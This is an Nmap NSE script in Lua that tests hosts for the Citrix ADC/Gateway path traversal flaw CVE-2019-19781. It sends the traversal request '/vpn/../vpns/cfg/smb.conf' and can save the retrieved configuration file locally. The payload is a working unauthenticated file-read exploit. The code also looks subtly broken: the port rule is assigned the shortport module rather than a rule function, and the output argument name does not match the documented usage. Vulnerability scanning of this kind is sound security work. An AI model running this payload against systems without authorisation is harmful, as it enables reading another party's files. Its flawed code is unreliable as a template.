local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"
local nmap = require "nmap"
local io = require "io"

description = [[
This NSE script checks whether the target server is vulnerable to CVE-2019-19781
]]
---
-- @usage
-- nmap --script https-citrix-path-traversal -p <port> <host>
-- nmap --script https-citrix-path-traversal -p <port> <host> --script-args output='file.txt'
-- @output
-- PORT   STATE SERVICE
-- 443/tcp open  http
-- | CVE-2019-19781: 
-- |   Host is vulnerable to CVE-2019-19781
-- @changelog
-- 16-01-2020 - Author: Dhiraj Mishra (@RandomDhiraj)
-- 17-12-2019 - Discovery: Mikhail Klyuchnikov (@__Mn1__)
-- @xmloutput
-- <elem key="title">Citrix ADC Path Traversal aka (Shitrix)</elem>
-- <elem key="state">VULNERABLE</elem>
-- <table key="description">
-- <elem>Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0 are vulnerable to a unauthenticated path 
-- traversal vulnerability that allows attackers to read configurations or any other file.</elem>
-- </table>
-- <table key="dates">
-- <table key="disclosure">
-- <elem key="year">2019</elem>
-- <elem key="day">17</elem>
-- <elem key="month">12</elem>
-- </table>
-- </table>
-- <elem key="disclosure">17-12-2019</elem>
-- <table key="extra_info">
-- </table>
-- <table key="refs">
-- <elem>https://support.citrix.com/article/CTX267027</elem>
-- <elem>https://nvd.nist.gov/vuln/detail/CVE-2019-19781</elem>
-- </table>
-- </table>

author = "Dhiraj Mishra (@RandomDhiraj)"
Discovery = "Mikhail Klyuchnikov (@__Mn1__)"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery","exploit","vuln"}

portrule = shortport

action = function(host,port)
  local outputFile = stdnse.get_script_args(SCRIPT_NAME..".output")
  local vuln = {
    title = 'Citrix ADC Path Traversal',
    state = vulns.STATE.NOT_EXPLOIT,
    description = [[
	Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0 are vulnerable 
	to a unauthenticated path traversal vulnerability that allows attackers to read configurations or any other file.
    ]],
    references = {
      'https://support.citrix.com/article/CTX267027',
      'https://nvd.nist.gov/vuln/detail/CVE-2019-19781',
    },
    dates = {
      disclosure = {year = '2019', month = '12', day = '17'},
    },
  }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local path = "/vpn/../vpns/cfg/smb.conf"
  local response
  local output = {}
  local success = "Host is vulnerable to CVE-2019-19781"
  local fail = "Host is not vulnerable"
  local match = "[global]"
  local credentials
  local citrixADC
	
  response = http.get(host, port, path)  

  if not response.status then
    stdnse.print_debug("Request Failed")
    return
  end
  if response.status == 200 then
    if string.match(response.body, match) then
      stdnse.print_debug("%s: %s GET %s - 200 OK", SCRIPT_NAME,host.targetname or host.ip, path)
      vuln.state = vulns.STATE.EXPLOIT
      citrixADC = (("Path traversal: https://%s:%d%s"):format(host.targetname or host.ip,port, path))
		
      if outputFile then
        credentials = response.body:gsub('%W','.')
	vuln.check_results = stdnse.format_output(true, citrixADC)
        vuln.extra_info = stdnse.format_output(true, "Output are being stored in a file")
	file = io.open(outputFile, "w")
	file:write(credentials, "\n")
      else
        vuln.check_results = stdnse.format_output(true, citrixADC)
      end
    end
  elseif response.status == 403 then
    stdnse.print_debug("%s: %s GET %s - %d", SCRIPT_NAME, host.targetname or host.ip, path, response.status)
    vuln.state = vulns.STATE.NOT_EXPLOIT
  end

  return vuln_report:make_output(vuln)
end
